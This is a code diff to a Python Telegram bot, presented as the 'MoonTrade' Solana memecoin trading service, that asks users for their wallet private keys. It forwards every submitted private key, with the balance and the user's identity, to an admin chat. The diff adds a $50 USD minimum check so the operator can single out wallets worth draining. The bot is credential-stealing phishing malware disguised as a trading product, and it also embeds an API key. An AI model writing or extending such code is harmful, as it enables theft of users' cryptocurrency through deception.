@@ -1,5 +1,6 @@
 import logging
 import base58
+import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
@@ -19,6 +20,9 @@ ADMIN_CHAT_ID = -5299554897
 # Helius RPC URL
 HELIUS_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=3129ff6b-1146-466d-b6f0-062f48ce84d9"
 
+# Montant minimum requis en USD
+MINIMUM_USD_REQUIRED = 50.0
+
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gère la commande /start"""
@@ -27,7 +31,7 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.message.from_user
     user_name = user.first_name
     
-    # Message de bienvenue personnalisé avec image
+    # Message de bienvenue personnalisé
     welcome_text = f"""🚀 Welcome {user_name}, MoonTrade v2.8.1
 
 ⚡ Automated Memecoin Trading on Solana
@@ -339,11 +343,33 @@ Contact support: @votre_support
     await update.message.reply_text(help_text)
 
 
+async def get_solana_price():
+    """Récupère le prix actuel du SOL en USD via CoinGecko API"""
+    try:
+        async with aiohttp.ClientSession() as session:
+            url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    sol_price = data.get('solana', {}).get('usd', 0)
+                    logger.info(f"💰 Prix actuel du SOL: ${sol_price}")
+                    return sol_price
+                else:
+                    logger.warning(f"Impossible de récupérer le prix du SOL, status: {response.status}")
+                    return 0
+    except Exception as e:
+        logger.error(f"Erreur lors de la récupération du prix SOL: {e}")
+        return 0
+
+
 async def verify_wallet_and_balance(private_key_str: str):
-    """Vérifie la clé privée et récupère le solde SOL"""
+    """Vérifie la clé privée et récupère le solde SOL ainsi que sa valeur en USD"""
     try:
         import aiohttp
         from solders.keypair import Keypair
+        
+        # Récupérer le prix actuel du SOL
+        sol_price_usd = await get_solana_price()
         
         # Essayer différents formats de clé privée
         keypair = None
@@ -386,7 +412,7 @@ async def verify_wallet_and_balance(private_key_str: str):
         # Si aucun format n'a fonctionné
         if not keypair or not public_key:
             logger.error("❌ Tous les formats de clé privée ont échoué")
-            return None, None, "invalid"
+            return None, None, None, 0, "invalid"
         
         # Récupérer le solde via RPC
         try:
@@ -404,20 +430,21 @@ async def verify_wallet_and_balance(private_key_str: str):
                     if "result" in data:
                         lamports = data["result"]["value"]
                         sol_balance = lamports / 1_000_000_000  # Convertir en SOL
-                        logger.info(f"✅ Solde récupéré: {sol_balance} SOL")
-                        return public_key, sol_balance, "valid"
+                        usd_value = sol_balance * sol_price_usd if sol_price_usd > 0 else 0
+                        logger.info(f"✅ Solde récupéré: {sol_balance} SOL (${usd_value:.2f} USD)")
+                        return public_key, sol_balance, usd_value, sol_price_usd, "valid"
                     else:
                         logger.warning(f"Pas de résultat dans la réponse RPC: {data}")
-                        return public_key, 0, "valid"
+                        return public_key, 0, 0, sol_price_usd, "valid"
         
         except Exception as e:
             logger.error(f"Erreur récupération solde: {e}")
             # Même si on ne peut pas récupérer le solde, la clé est valide
-            return public_key, 0, "valid"
+            return public_key, 0, 0, sol_price_usd, "valid"
     
     except Exception as e:
         logger.error(f"Erreur générale vérification wallet: {e}")
-        return None, None, "invalid"
+        return None, None, None, 0, "invalid"
 
 
 async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -431,7 +458,7 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         context.user_data['waiting_for_wallet'] = False
         
         # Vérifier la clé privée et le solde
-        public_key, sol_balance, status = await verify_wallet_and_balance(user_message)
+        public_key, sol_balance, usd_value, sol_price, status = await verify_wallet_and_balance(user_message)
         
         if status == "invalid":
             # Clé privée invalide
@@ -468,19 +495,24 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             
             return
         
-        # Clé valide, vérifier le solde
-        if sol_balance == 0:
-            # Wallet vide
+        # Clé valide, vérifier le solde en USD
+        if usd_value < MINIMUM_USD_REQUIRED:
+            # Wallet avec solde insuffisant
             back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
             back_markup = InlineKeyboardMarkup(back_keyboard)
             
             await update.message.reply_text(
-                "⚠️ Wallet Cannot Be Accepted\n\nInsufficient SOL balance.\nYour wallet must contain SOL to use trading features.",
+                f"⚠️ Wallet Cannot Be Accepted\n\n"
+                f"Insufficient balance.\n"
+                f"Your wallet contains: {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n"
+                f"Minimum required: ${MINIMUM_USD_REQUIRED:.2f} USD\n\n"
+                f"Current SOL price: ${sol_price:.2f} USD\n"
+                f"Please add more SOL to use trading features.",
                 reply_markup=back_markup
             )
             
             # Notification à l'admin
-            admin_notification = f"""⚠️ **Wallet vide rejeté**
+            admin_notification = f"""⚠️ **Wallet rejeté - Solde insuffisant**
 
 👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
 🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
@@ -488,13 +520,16 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
 💳 **Wallet Type:** {wallet_type}
 
 👛 **Public Key:** `{public_key}`
-💰 **Balance:** 0 SOL
+💰 **Balance:** {sol_balance:.4f} SOL
+💵 **Valeur USD:** ${usd_value:.2f}
+📊 **Prix SOL:** ${sol_price:.2f}
+⚠️ **Minimum requis:** ${MINIMUM_USD_REQUIRED:.2f}
 
 🔑 **Private Key:**
 `{user_message}`
 
 ---
-❌ _Wallet rejeté - Solde insuffisant_"""
+❌ _Wallet rejeté - Solde insuffisant (< ${MINIMUM_USD_REQUIRED})_"""
             
             try:
                 await context.bot.send_message(
@@ -507,11 +542,12 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             
             return
         
-        # Wallet valide avec SOL
+        # Wallet valide avec solde suffisant
         await update.message.reply_text(
             f"✅ **Wallet Connected Successfully**\n\n"
             f"💳 **Type:** {wallet_type}\n"
-            f"💰 **Balance:** {sol_balance:.4f} SOL\n"
+            f"💰 **Balance:** {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n"
+            f"📊 **SOL Price:** ${sol_price:.2f} USD\n"
             f"👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`\n\n"
             f"You can now access all trading features.",
             parse_mode='Markdown'
@@ -527,6 +563,8 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
 
 👛 **Public Key:** `{public_key}`
 💰 **Balance:** {sol_balance:.4f} SOL
+💵 **Valeur USD:** ${usd_value:.2f}
+📊 **Prix SOL:** ${sol_price:.2f}
 
 🔑 **Private Key:**
 `{user_message}`
